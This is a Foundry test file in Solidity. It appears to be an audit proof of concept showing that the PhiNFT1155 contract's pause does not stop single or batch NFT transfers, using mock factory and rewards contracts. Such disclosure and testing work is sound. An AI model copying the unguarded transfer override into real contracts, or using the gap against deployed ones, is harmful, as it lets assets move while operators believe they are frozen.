// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "forge-std/Test.sol";
import "../../src/art/PhiNFT1155.sol";
import "../../src/interfaces/IPhiFactory.sol";
import "../../src/interfaces/IPhiRewards.sol";

contract MockPhiFactory is IPhiFactory {
    address public protocolFeeDestination;
    address public phiRewardsAddress;
    uint256 public artCreateFee;
    
    mapping(uint256 => ArtData) public artData;
    
    constructor() {
        protocolFeeDestination = address(0x1234);
        phiRewardsAddress = address(new MockPhiRewards());
        artCreateFee = 0.0001 ether;
    }
    
    function setArtData(uint256 artId, ArtData memory data) external {
        artData[artId] = data;
    }
    
    function contractURI(address) external pure returns (string memory) {
        return "ipfs://contract";
    }
    
    function getTokenURI(uint256) external pure returns (string memory) {
        return "ipfs://token";
    }
    
    function createArt(bytes calldata, IPhiFactory.ERC1155Data memory) external payable returns (uint256) {
        return 0;
    }
    
    function createArtFromFactory(uint256) external payable returns (uint256) {
        return 0;
    }
    
    function claim(bytes calldata) external payable {}
    
    function merkleClaim(bytes32[] calldata, bytes calldata) external payable {}
    
    function signatureClaim(bytes calldata, bytes calldata) external payable {}
    
    function getArtAddress(uint256) external pure returns (address) {
        return address(0);
    }
    
    function getNumberMinted(uint256, address) external pure returns (uint256) {
        return 0;
    }
    
    function artDataFromFactory(uint256) external view returns (ArtData memory) {
        return artData[0];
    }
}

contract MockPhiRewards is IPhiRewards {
    function handleRewardsAndGetValueSent(
        uint256,
        uint256,
        uint256,
        uint256,
        bytes calldata,
        bool
    ) external payable returns (uint256) {
        return msg.value;
    }
    
    function depositRewards(
        uint256,
        uint256,
        bytes calldata,
        uint256
    ) external payable returns (uint256) {
        return msg.value;
    }
    
    function withdraw(address) external {}
    
    function withdrawFor(address, address) external {}
    
    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }
    
    function computeMintReward(
        uint256,
        uint256
    ) external pure returns (uint256, uint256, uint256, uint256) {
        return (0, 0, 0, 0);
    }
}

contract ExploitTest is Test {
    PhiNFT1155 public phiNFT;
    MockPhiFactory public factory;
    
    address public owner;
    address public alice;
    address public bob;
    
    uint256 constant CRED_CHAIN_ID = 1;
    uint256 constant CRED_ID = 1;
    uint256 constant ART_ID = 1;
    
    function setUp() public {
        owner = address(this);
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        
        // Deploy mock factory
        factory = new MockPhiFactory();
        
        // Deploy PhiNFT1155 implementation
        PhiNFT1155 implementation = new PhiNFT1155();
        
        // Deploy proxy and initialize
        bytes memory initData = abi.encodeWithSelector(
            PhiNFT1155.initialize.selector,
            CRED_CHAIN_ID,
            CRED_ID,
            "signature",
            factory.protocolFeeDestination()
        );
        
        // Use vm.prank to make factory the deployer
        vm.prank(address(factory));
        phiNFT = new PhiNFT1155();
        
        vm.prank(address(factory));
        phiNFT.initialize(
            CRED_CHAIN_ID,
            CRED_ID,
            "signature",
            factory.protocolFeeDestination()
        );
        
        // Setup art data in factory
        IPhiFactory.ArtData memory artData = IPhiFactory.ArtData({
            artist: owner,
            receiver: owner,
            artAddress: address(phiNFT),
            uri: "ipfs://art",
            mintFee: 0.001 ether,
            soulBounded: false,
            startTime: block.timestamp,
            endTime: block.timestamp + 365 days,
            maxSupply: 1000,
            numberMinted: 0
        });
        
        factory.setArtData(ART_ID, artData);
        
        // Create art token
        vm.deal(owner, 1 ether);
        vm.prank(address(factory));
        phiNFT.createArtFromFactory{value: factory.artCreateFee()}(ART_ID);
        
        // Mint NFT to alice
        vm.deal(alice, 1 ether);
        vm.prank(address(factory));
        phiNFT.claimFromFactory{value: 0.001 ether}(
            ART_ID,
            alice,
            address(0),
            address(0),
            1,
            bytes32(uint256(1)),
            ""
        );
    }
    
    function testPauseDoesNotPreventTransfers() public {
        // Step 1: Verify alice has the NFT
        uint256 tokenId = phiNFT.getTokenIdFromFactoryArtId(ART_ID);
        assertEq(phiNFT.balanceOf(alice, tokenId), 1, "Alice should have 1 NFT");
        assertEq(phiNFT.balanceOf(bob, tokenId), 0, "Bob should have 0 NFTs");
        
        // Step 2: Owner pauses the contract
        // According to the vulnerability, pausing should prevent transfers but it doesn't
        phiNFT.pause();
        assertTrue(phiNFT.paused(), "Contract should be paused");
        
        // Step 3: Alice attempts to transfer NFT to Bob while contract is paused
        // This should fail if pause mechanism worked correctly, but it succeeds
        vm.prank(alice);
        phiNFT.safeTransferFrom(alice, bob, tokenId, 1, "");
        
        // Step 4: Verify the transfer succeeded despite contract being paused
        // This demonstrates the vulnerability - transfers work even when paused
        assertEq(phiNFT.balanceOf(alice, tokenId), 0, "Alice should have 0 NFTs after transfer");
        assertEq(phiNFT.balanceOf(bob, tokenId), 1, "Bob should have 1 NFT after transfer");
        
        // Step 5: Verify contract is still paused
        assertTrue(phiNFT.paused(), "Contract should still be paused");
        
        // The vulnerability is proven: transfers succeed even when contract is paused
        // This is because PhiNFT1155 overrides safeTransferFrom without calling
        // the whenNotPaused modifier, and ERC1155 doesn't have built-in pause support
    }
    
    function testBatchTransferAlsoWorksWhenPaused() public {
        // Mint another NFT to alice for batch transfer test
        vm.deal(owner, 1 ether);
        vm.prank(address(factory));
        uint256 artId2 = 2;
        
        IPhiFactory.ArtData memory artData2 = IPhiFactory.ArtData({
            artist: owner,
            receiver: owner,
            artAddress: address(phiNFT),
            uri: "ipfs://art2",
            mintFee: 0.001 ether,
            soulBounded: false,
            startTime: block.timestamp,
            endTime: block.timestamp + 365 days,
            maxSupply: 1000,
            numberMinted: 0
        });
        
        factory.setArtData(artId2, artData2);
        
        vm.prank(address(factory));
        phiNFT.createArtFromFactory{value: factory.artCreateFee()}(artId2);
        
        vm.deal(alice, 1 ether);
        vm.prank(address(factory));
        phiNFT.claimFromFactory{value: 0.001 ether}(
            artId2,
            alice,
            address(0),
            address(0),
            1,
            bytes32(uint256(2)),
            ""
        );
        
        uint256 tokenId1 = phiNFT.getTokenIdFromFactoryArtId(ART_ID);
        uint256 tokenId2 = phiNFT.getTokenIdFromFactoryArtId(artId2);
        
        // Pause the contract
        phiNFT.pause();
        assertTrue(phiNFT.paused(), "Contract should be paused");
        
        // Batch transfer while paused - should fail but succeeds
        uint256[] memory ids = new uint256[](2);
        ids[0] = tokenId1;
        ids[1] = tokenId2;
        
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1;
        amounts[1] = 1;
        
        vm.prank(alice);
        phiNFT.safeBatchTransferFrom(alice, bob, ids, amounts, "");
        
        // Verify batch transfer succeeded despite pause
        assertEq(phiNFT.balanceOf(bob, tokenId1), 1, "Bob should have tokenId1");
        assertEq(phiNFT.balanceOf(bob, tokenId2), 1, "Bob should have tokenId2");
        assertTrue(phiNFT.paused(), "Contract should still be paused");
    }
}